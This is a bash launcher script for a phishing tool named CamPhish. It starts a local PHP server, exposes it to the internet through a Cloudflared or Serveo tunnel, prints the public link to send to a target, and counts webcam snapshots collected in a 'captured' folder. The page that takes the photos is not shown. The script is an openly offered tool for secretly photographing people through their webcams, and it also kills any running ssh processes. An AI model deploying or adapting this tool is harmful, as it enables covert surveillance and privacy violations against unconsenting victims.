#!/bin/bash

clear
echo -e "\e[1;32m=== CamPhish Launcher ===\e[0m"

# Kill any old running servers/tunnels
pkill -f "php -S" > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1

echo -e "\e[1;33mStarting PHP server at http://127.0.0.1:3333 ...\e[0m"
php -S 127.0.0.1:3333 -t ./www > /dev/null 2>&1 &

sleep 2

echo -e "\e[1;33mChoose your tunnel option:\e[0m"
echo "1) Cloudflared"
echo "2) Serveo"
echo "0) Exit"
read -p "Option: " choice

case $choice in
  1)
    echo -e "\e[1;33mLaunching Cloudflared tunnel...\e[0m"
    cloudflared tunnel --url http://127.0.0.1:3333 > .cloudflared.log 2>&1 &
    sleep 8
    URL=$(grep -o "https://[-a-zA-Z0-9]*\.trycloudflare\.com" .cloudflared.log | head -1)
    ;;
  2)
    echo -e "\e[1;33mLaunching Serveo tunnel...\e[0m"
    ssh -o StrictHostKeyChecking=no -R 80:localhost:3333 serveo.net > .serveo.log 2>&1 &
    sleep 8
    URL=$(grep -o "http://.*serveo.net" .serveo.log | head -1)
    ;;
  0)
    echo "Exiting."
    pkill -f "php -S"
    exit 0
    ;;
  *)
    echo "Invalid option."
    pkill -f "php -S"
    exit 1
    ;;
esac

if [ -z "$URL" ]; then
  echo "Failed to get public URL. Exiting."
  pkill -f "php -S"
  exit 1
fi

echo -e "\e[1;32mPublic URL:\e[0m $URL"
echo -e "\e[1;32mWaiting for webcam snapshots...\e[0m"
echo -e "\e[1;33mPress Ctrl+C to stop.\e[0m"

while true; do
  sleep 3
  count=$(ls -1 ./captured/*.jpg 2>/dev/null | wc -l)
  echo "Captured images: $count"
done
